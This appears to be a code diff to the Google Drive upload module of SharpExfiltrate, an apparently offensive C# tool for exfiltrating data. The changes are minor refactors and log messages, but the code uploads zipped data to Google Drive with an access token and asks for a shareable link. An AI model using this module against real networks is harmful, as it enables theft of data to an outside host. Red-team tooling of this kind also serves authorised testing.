@@ -26,7 +26,7 @@ namespace SharpExfiltrate.Modules
         {
             this.googleDriveOptions = googleDriveOptions;
             this.googleDriveService = Init(
-                googleDriveOptions.Appname,
+                googleDriveOptions.AppName,
                 googleDriveOptions.AccessToken
                 ).GetAwaiter().GetResult();
         }
@@ -68,19 +68,23 @@ namespace SharpExfiltrate.Modules
 
         public async Task<string> UploadFile(Stream file, string fileName)
         {
+            Console.WriteLine("[+] Launching GoogleDrive module by @Flangvik");
 
+            //Set global vars for upload stats
             FileSize = file.Length;
+            FileName = fileName;
+
+
             var driveFile = new Google.Apis.Drive.v3.Data.File();
             driveFile.Name = fileName;
-            FileName = fileName;
+         
             driveFile.MimeType = "application/zip";
 
             FilesResource.CreateMediaUpload request = googleDriveService.Files.Create(driveFile, file, driveFile.MimeType);
 
-           // request.Fields = "id";
             request.Fields = "webContentLink";
    
-            Console.WriteLine("[+] Starting upload");
+            Console.WriteLine("[+] Starting GoogleDrive upload");
 
             request.ProgressChanged += Upload_ProgressChanged;
 
